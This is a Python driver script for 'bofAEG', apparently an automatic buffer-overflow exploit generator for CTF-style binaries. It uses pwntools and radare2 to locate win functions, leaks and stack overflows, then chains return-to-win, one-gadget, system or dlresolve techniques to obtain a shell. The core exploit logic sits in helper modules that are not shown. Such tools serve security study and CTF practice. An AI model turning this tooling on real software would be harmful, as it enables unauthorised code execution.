#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from fileinput import filename
from gevent import kill
from py import process
import r2pipe
import json
import sys
import os
import pwd
import logging

import IPython

from utils.my_utils import *
from utils.classses import *

pwn.context.log_level = 'debug'
pwn.context.arch = 'amd64'



if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description="Binary Exploitation Tool - Buffer Overflow - bofAEG")

    parser.add_argument('--base', '-b', help='Base address of binary')
    parser.add_argument('--find-win', '-fw', action='store_true', help='Use find win function')
    parser.add_argument('--win-address', '-wa', help='Specify the name of win function')
    parser.add_argument('--canary', '-cn', help='Specify stack canary address')
    parser.add_argument('--get-shell', '-gsh', action='store_true', help='Use get shell technique')
    parser.add_argument('--binary', '-bin', help="Binary's path")
    parser.add_argument('--ret-2-win', '-r2w', action='store_true', help='Return to win function technique')
    parser.add_argument('--ret-2-one-gadget', '-r2o', action='store_true', help='Return to one gadget technique')
    parser.add_argument('--ret-2-system', '-r2s', action='store_true', help='Return to system technique')
    parser.add_argument('--ret-2-dlresolve', '-r2dl', action='store_true', help='Return to dlresolve technique')
    parser.add_argument('--libc-path', '-lp', help='Path of libc')
    parser.add_argument('--int-max-str-digit', '-imsd', help="Use for set max int str digit")
    parser.add_argument('--shift-offset', '-so', help="Shift offset of libc function", type=int, default=0)
    parser.add_argument('--integer-overflow', '-io', help="Use integer overflow mode", action="store_true")
    parser.add_argument('--int', help="Integer to overflow", type=int)
    parser.add_argument('--int-offset', help="Len to buffer's int overflow", type=int)
    parser.add_argument('--prefix', help="Prefix of payload", type=str)
    
    args = parser.parse_args()
    filepath = args.binary
    
    if not filepath:
        print("You must specify binary. Use -h for more information.")
        exit()

    if not args.int_max_str_digit:
        sys.set_int_max_str_digits(10000)
    else:
        sys.set_int_max_str_digits(args.int_max_str_digit)
    # file path for radare2 initalization
    global inputpath, outputpath
    
    inputpath = "./input.txt"
    outputpath = "./output.txt"
    
    if not args.libc_path:
        libpath = f"/home/{pwd.getpwuid(os.getuid())[0]}/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/"
    else:
        libpath = args.libc_path
    init_profile(filepath, libpath, inputpath, outputpath)

    pwn.ctx.binary = filepath
    pwn.ctx.custom_lib_dir = libpath
    pwn.ctx.debug_remote_libc = True

    p = pwn.ctx.start()
    #p = pwn.process(filepath, env={'LD_PRELOAD':libpath+'ld-linux-x86-64.so.2','LD_LIBRARY_PATH':libpath})

    pwn.context.binary = elf = pwn.ELF(filepath, checksec=False)
    if elf.pie:
        if args.base:
            elf.address = parse_str_to_int(args.base)
    else: p.info(f"Base address: {hex(elf.address)}")

    static_r2 = r2pipe.open(filepath) if not elf.pie \
        else r2pipe.open(filepath,flags=['-B',f'{hex(elf.address)}'])
    static_r2.cmd('aaa')
    
    plt = {}
    for i in json.loads(static_r2.cmd('iij')):
        if 'plt' not in i.keys():
            i['plt'] = None
        if i['plt'] and i['plt'] != elf.address: plt[i['name']] = i['plt']
    elf.plt = plt
    

    bof_aeg = Bof_Aeg(filepath, elf, inputpath, outputpath, libpath, p)
    
    if args.integer_overflow:
        bof_aeg.int_overflow(args.int, args.int_offset, prefix=args.prefix)
        exit(0)
    
    bof_aeg.find_win()

    if elf.pie:
        bof_aeg.explore_to_win()
        # Looking for address leaks in your program
        bof_aeg.find_leak(shift_offset=args.shift_offset)

    p.info('Starting find stack bof')
    bof_aeg.find_stack_bof()
    p.info('Find stack bof ended')
    
    p.info('Trying to get shell')
    bof_aeg.get_shell()
    p.info('Get shell finished')
